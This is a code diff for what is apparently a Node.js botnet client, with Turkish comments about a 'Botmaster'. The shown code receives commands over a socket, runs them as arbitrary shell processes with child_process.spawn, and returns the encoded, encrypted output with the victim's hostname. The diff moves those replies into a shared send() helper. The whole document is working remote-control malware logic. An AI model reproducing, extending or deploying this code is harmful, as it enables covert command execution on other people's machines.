@@ -1,10 +1,13 @@
 module.exports = function(){
     return (function(thisSocket){
-        var crypto = require('../crypto');
+        var crypto = require('./crypto');
         var parser = require('./parser');
         var Packet = require('../models/Packet');
         var Promise = require('promise');
 
+
+
+        var send = require('./sender')(thisSocket).send;
         var spawn = require('child_process').spawn;
 
 
@@ -17,18 +20,22 @@ module.exports = function(){
         var command;
         var commandData;
 
+        //console.log("SOCKETTT-PROCESSOR="+thisSocket.id);
+
         //Botmasterdan gelen paketin işlendiği kısım.
         var processPacket = function(packet, receiver_id, sender_id){
             self.sender_id = sender_id;
             self.receiver_id = receiver_id;
 
+            console.log("base Socket="+thisSocket);
+
             command = Object.keys(packet.data);
             commandData = packet.data[command];
             console.log("CMD-DATA="+commandData);
 
-            var result = commandHandler(command, commandData, self.receiver_id, self.sender_id);
+            commandHandler(command, commandData, self.receiver_id, self.sender_id);
 
-            return result;
+
 
         };
 
@@ -58,22 +65,15 @@ module.exports = function(){
                                 output:new Buffer.from("Proses basariyla sonlandirildi.").toString('base64'),
                                 name:hostname});
 
-                            var encoded = parser.encode(paket);
-                            console.log("ENCODED",encoded);
-                            var encrypted = crypto.encrypt(encoded);
-                            console.log("ENCRYPTED="+encrypted);
-                            return encrypted;
+
+                            send(paket);
 
                         }catch (err){
                             var paket = new Packet(receiver_id, sender_id, {
                                 output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
                                 name:hostname});
 
-                            var encoded = parser.encode(paket);
-                            console.log("ENCODED",encoded);
-                            var encrypted = crypto.encrypt(encoded);
-                            console.log("ENCRYPTED="+encrypted);
-                            return encrypted;
+                            send(paket);
                         }
 
                     }else if(firstElement === 'kira'){
@@ -82,7 +82,7 @@ module.exports = function(){
 
                     }else{
                         //Botmasterın gönderdiği komutu icra eden kısım. Output oldukça fulfill gönderir.
-                        return new Promise(function(fulfill, reject){
+
                             child_p = spawn(firstElement, args);
                             child_p.stdout.setEncoding('utf-8');
 
@@ -91,11 +91,7 @@ module.exports = function(){
                                     output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
                                     name:hostname});
 
-                                var encoded = parser.encode(paket);
-                                console.log("ENCODED",encoded);
-                                var encrypted = crypto.encrypt(encoded);
-                                console.log("ENCRYPTED="+encrypted);
-                                fulfill(encrypted);
+                                send(paket);
 
                             });
 
@@ -109,16 +105,12 @@ module.exports = function(){
                                     paket = new Packet(receiver_id, sender_id, {
                                         output:new Buffer(output).toString('base64'),
                                         name:hostname});
-                                    console.log("OUTPUT="+output);
-                                    var encoded = parser.encode(paket);
-                                    console.log("ENCODED",encoded);
-                                    var encrypted = crypto.encrypt(encoded);
-                                    console.log("ENCRYPTED="+encrypted);
-                                    fulfill(encrypted);
+
+                                    send(paket);
                                 }
 
                             });
-                        })
+
                         //Botmaster terminal komutu gönderdiğinde çalışacak kısım.
                         /*return new Promise(function(fulfill, reject){
                            //console.log(data);
@@ -166,18 +158,15 @@ module.exports = function(){
 
 
             }else if(command == 'ack'){
-                var paket = new Packet(receiver_id, sender_id, {name:hostname});
-                var encoded = parser.encode(paket);
-                console.log("ENCODED",encoded);
-                var encrypted = crypto.encrypt(encoded);
 
-                return encrypted;
+                var paket = new Packet(receiver_id, sender_id, {name:hostname});
+
+                send(paket);
             }else {
+
                 var paket = new Packet(receiver_id, sender_id, 'selam');
-                var encoded = parser.encode(paket);
-                console.log("ENCODED",encoded);
-                var encrypted = crypto.encrypt(encoded);
-                return encrypted;
+
+                send(paket);
             }
 
         }
